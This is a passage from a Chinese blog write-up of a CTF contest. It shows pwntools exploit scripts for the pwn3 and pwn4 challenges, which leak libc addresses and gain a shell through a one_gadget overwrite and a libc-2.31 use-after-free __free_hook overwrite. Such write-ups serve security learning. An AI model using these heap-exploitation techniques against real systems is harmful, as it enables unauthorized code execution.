 io.sendafter(&#x27; level :\n&#x27;,description)

def power(description):
 io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)
 io.sendafter(&#x27;another level :&#x27;,description) 

def beat(): 
 io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)

def give_up():
 io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)
   
def exp():
 create(&#x27;a&#x27;*35+&#x27;\n&#x27;)
 power(&#x27;a&#x27;)
 power(&#x27;\xff\xff\xff\xff&#x27;)
 beat()
 
 io.recvuntil(&#x27;reward: &#x27;)
 puts=int(io.recv(14),16)
 libc_base=puts-libc.symbols[&#x27;puts&#x27;] 
 print(&#x27;libc_base&#x27;,hex(libc_base))
 system=libc_base+libc.symbols[&#x27;system&#x27;]
 binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()
 dl_rtld_unlock_recursive = libc_base+0x5f0040+3856
 gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]
 #gdb.attach(io)
 io.sendafter(&#x27;your name:&#x27;,p64(dl_rtld_unlock_recursive))
 
 io.sendafter(&#x27;for you!&#x27;,p64(gadget[7]+libc_base))
 io.interactive()
exp()</code></pre>
<h3 id="pwn4">【pwn4】</h3>
<p>这个题有个小问题，忘了在add函数后加break跳出switch，因此有师傅修switch时修不出来add，只能看汇编代码，在这里和各位师傅道个歉。</p>
<p>此题的漏洞在free时没有对指针置0，libc-2.31的uaf。<img src="https://img-blog.csdnimg.cn/img_convert/501648abb30189f7c023ce63ab1c964e.webp?x-oss-process=image/format,png" alt="图片"></p>
<p>exp</p>
<pre><code class="hljs plaintext">from pwn import *
io=process(&#x27;./pwn4&#x27;)
elf=ELF(&#x27;./pwn4&#x27;)
libc=elf(&#x27;./libc-2.31.so&#x27;)
context.log_level=&#x27;debug&#x27;

def add(index,name,key,value):
 io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)
 io.sendlineafter(&#x27;Your index: &#x27;,str(index))
 io.sendlineafter(&#x27;Enter your name: &#x27;,name)
 io.sendlineafter(&#x27;Please input a key: &#x27;,key)
 io.sendlineafter(&#x27;Please input a value: &#x27;,str(value))
 
def show(index):
 io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)
 io.sendlineafter(&#x27;Your index: &#x27;,str(index))

def edit(index,name,length,key,value):
 io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)
 io.sendlineafter(&#x27;Your index: &#x27;,str(index))
 io.sendlineafter(&#x27;Enter your name: &#x27;,name)
 io.sendlineafter(&#x27;New key length: &#x27;,str(length))
 io.sendlineafter(&#x27;Key: &#x27;,key)
 io.sendlineafter(&#x27;Value: &#x27;,str(value))
 
def dele(index):
 io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;4&#x27;)
 io.sendlineafter(&#x27;Your index: &#x27;,str(index))
 
def exp():
 add(0,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x417,0)
 add(1,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x3c7,1)
 dele(0)
 show(0)
 malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - 96 -16
 libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]
 print(&#x27;libc_base&#x27;,hex(libc_base))
 free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base
 system = libc.symbols[&#x27;system&#x27;] + libc_base
 
 add(2,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,2)
 add(3,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,3)
 dele(3)
 dele(2)
 #gdb.attach(io)
 edit(1,&#x27;f1ag&#x27;,8,&#x27;/bin/sh\x00&#x27;,1)
 edit(2,&#x27;f1ag&#x27;,6,p32((free_hook-0x51)&amp;0xffffffff)+p16(((free_hook)&gt;&gt;32)&amp;0xffff),2)
 
 add(4,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x51+p32((system)&amp;0xffffffff)+p16(((system)&gt;&gt;32)&amp;0xffff),&#x27;4&#x27;)
 
 #add(6,&#x27;f1ag&#x27;,p64(system),5)
 
 dele(1)
 io.interactive()
exp()</code></pre>

    </div>

    
    
    
        <div class="reward-container">
  <div>制作不易，如若感觉写的不错，欢迎打赏</div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    打赏
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechat.jpg" alt="故里 微信支付">
        <p>微信支付</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/zhifubao.jpg" alt="故里 支付宝">
        <p>支付宝</p>
      </div>

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>故里
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://hzy2003628.top/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/" title="长安“战疫”网络安全卫士守护赛wp">https://hzy2003628.top/2022/01/08/长安“战疫”网络安全卫士守护赛wp/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" rel="tag"><i class="fa fa-tag"></i> 赛后复盘</a>
              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
          </div>

        



        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/01/02/Python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93/" rel="prev" title="Python程序运行常见错误总结">
      <i class="fa fa-chevron-left"></i> Python程序运行常见错误总结
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/01/08/ctf%E4%B9%8Bweb/" rel="next" title="ctf之Web">
      ctf之Web <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>




        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AB%E5%8D%A6%E8%BF%B7%E5%AE%AB"><span class="nav-number">1.0.1.</span> <span class="nav-text">【八卦迷宫】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E7%9A%84%E5%8F%96%E8%AF%81"><span class="nav-number">1.0.2.</span> <span class="nav-text">【朴实无华的取证】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E5%A4%A9%E4%B9%A6"><span class="nav-number">1.0.3.</span> <span class="nav-text">【无字天书】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A5%BF%E5%AE%89%E5%8A%A0%E6%B2%B9"><span class="nav-number">1.0.4.</span> <span class="nav-text">【西安加油】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#binary"><span class="nav-number">1.0.5.</span> <span class="nav-text">【binary】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez_encrypt"><span class="nav-number">1.0.6.</span> <span class="nav-text">【ez_Encrypt】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez_steg"><span class="nav-number">1.0.7.</span> <span class="nav-text">【Ez_Steg】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pipicc"><span class="nav-number">1.0.8.</span> <span class="nav-text">【pipicc】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#no_cry_no_can"><span class="nav-number">2.0.1.</span> <span class="nav-text">no_cry_no_can</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#no_can_no_bb"><span class="nav-number">2.0.2.</span> <span class="nav-text">no_can_no_bb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#no_math_no_cry"><span class="nav-number">2.0.3.</span> <span class="nav-text">no_math_no_cry</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#combat_slogan"><span class="nav-number">3.0.1.</span> <span class="nav-text">combat_slogan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cute_doge"><span class="nav-number">3.0.2.</span> <span class="nav-text">cute_doge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hello_py"><span class="nav-number">3.0.3.</span> <span class="nav-text">hello_py</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">4.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rce_no_para"><span class="nav-number">4.0.1.</span> <span class="nav-text">【RCE_No_Para】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby_upload"><span class="nav-number">4.0.2.</span> <span class="nav-text">【Baby_Upload】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flask"><span class="nav-number">4.0.3.</span> <span class="nav-text">【flask】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro"><span class="nav-number">4.0.4.</span> <span class="nav-text">【Shiro?】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag%E9%85%8D%E9%80%81%E4%B8%AD%E5%BF%83"><span class="nav-number">4.0.5.</span> <span class="nav-text">【Flag配送中心】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tp"><span class="nav-number">4.0.6.</span> <span class="nav-text">【tp】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">5.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">5.0.1.</span> <span class="nav-text">【pwn1】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn2"><span class="nav-number">5.0.2.</span> <span class="nav-text">【pwn2】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn3"><span class="nav-number">5.0.3.</span> <span class="nav-text">【pwn3】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn4"><span class="nav-number">5.0.4.</span> <span class="nav-text">【pwn4】</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="故里"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">故里</p>
  <div class="site-description" itemprop="description">没有所谓失败，除非你不再尝试</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">90</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:2596328958@qq.com" title="E-Mail → mailto:2596328958@qq.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

<!--添加标签云-->
        
          <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
          <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
          <div class="widget-wrap">
            <div>标签云</div>
            <div id="myCanvasContainer" class="widget tagcloud">
              <canvas width="250" height="250" id="resCanvas" style="width=100%">
              <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">56</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E5%88%B7%E9%A2%98%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" rel="tag">CTF刷题平台推荐</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/" rel="tag">HTTP头部信息分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">PHP伪协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E7%89%B9%E6%80%A7/" rel="tag">PHP特性</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RE/" rel="tag">RE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">20</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%B7%A5%E5%85%B7%E5%8C%85/" rel="tag">Web工具包</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugctf/" rel="tag">bugctf</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctfshow/" rel="tag">ctfshow</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/next%E4%B8%BB%E9%A2%98%E5%A4%B1%E6%95%88/" rel="tag">next主题失效</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%8D%E8%92%9C%E5%AD%90%E4%B8%8D%E6%98%BE%E7%A4%BA/" rel="tag">不蒜子不显示</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/" rel="tag">博客主题优化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%AD%BB%E5%BE%AA%E7%8E%AF%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98/" rel="tag">博客死循环框架问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" rel="tag">博客部分问题解决方法</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B1%80%E5%9F%9F%E7%BD%91%E6%94%BB%E5%87%BB/" rel="tag">局域网攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" rel="tag">常用指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">文件上传漏洞</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%95%99%E8%A8%80%E6%9D%BF/" rel="tag">留言板</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/" rel="tag">评论系统</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" rel="tag">赛后复盘</a><span class="tag-list-count">34</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/" rel="tag">黑盒测试</a><span class="tag-list-count">1</span></li></ul>
              </canvas>
            </div>
         </div>
        
	  

	  
	  
	  


   </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022003011号-1 </a>
      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=%E8%B1%AB%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87%2041142602000197%E5%8F%B7" rel="noopener" target="_blank">豫公网安备 41142602000197号 </a>
  </div>


<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
   </span>
  <span class="author" itemprop="copyrightHolder">故里</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">768k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">11:38</span>
</div>







<section class="footer-time">
    <span class="footer__copyright">
    <div>
    <span id="span_dt_dt"> </span>
    <script language="javascript">
      function show_date_time(){
        window.setTimeout("show_date_time()", 1000);
        BirthDay=new Date("12/25/2021 10:56:12");//这个日期是可以修改的
        today=new Date();
        timeold=(today.getTime()-BirthDay.getTime());//其实仅仅改了这里
        sectimeold=timeold/1000
        secondsold=Math.floor(sectimeold);
        msPerDay=24*60*60*1000
        e_daysold=timeold/msPerDay
        daysold=Math.floor(e_daysold);
        e_hrsold=(e_daysold-daysold)*24;
        hrsold=Math.floor(e_hrsold);
        e_minsold=(e_hrsold-hrsold)*60;
        minsold=Math.floor((e_hrsold-hrsold)*60);
        seconds=Math.floor((e_minsold-minsold)*60);
        span_dt_dt.innerHTML="我已在此等候你 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
      }
      show_date_time();
    </script>
    </div>
	
	




<!--这一段是不蒜子的访问量统计代码-->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
我的第<span id="busuanzi_value_site_uv"></span>位朋友
历经<span id="busuanzi_value_site_pv"></span>次回眸才与你相遇</span>

	 
	 
	 

<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://z4a.net/images/2022/05/31/image649ac1128183cf97.png"align="absmiddle" width="59px" height="30px" /></a>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='255,255,225' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="/js/local-search.js"></script>













  

  


  

  <script src="/js/activate-power-mode.min.js"></script>
  <script>
    POWERMODE.colorful = true;
    POWERMODE.shake = false;
    document.body.addEventListener('input', POWERMODE);
  </script>


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : true,
      appId      : 'kkHz96fwDwdnhN10VTUS0KUx-gzGzoHsz',
      appKey     : '3th47KWUKTQ2oX3tNXqz6WQW',
      placeholder: "来留下你的痕迹吧",
      avatar     : 'retro',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>



<script type="text/javascript" src="/js/love.js"></script>




<script type="text/javascript">
    var OriginTitile=document.title,st;
	document.addEventListener("visibilitychange",function(){
        document.hidden?(document.title="ヽ(●-`Д´-)ノ网页崩溃了",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ骗你的，别走了！",st=setTimeout(function(){document.title=OriginTitile},3e3))
    })
</script>